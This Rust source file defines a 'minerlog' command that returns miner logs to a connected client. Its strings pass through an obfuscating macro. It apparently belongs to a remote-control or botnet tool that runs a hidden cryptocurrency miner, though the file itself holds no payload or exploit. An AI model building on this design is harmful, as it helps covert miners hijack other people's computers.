use super::prelude::*;

pub struct MinerStatus;

#[async_trait]
impl Command for MinerStatus {
    fn name(&self) -> String {
        crypto!("minerlog")
    }

    fn help(&self) -> String {
        crypto!("Getting miner logs")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        client.send(ok(format!("{}", crypto::log())))
    }
}
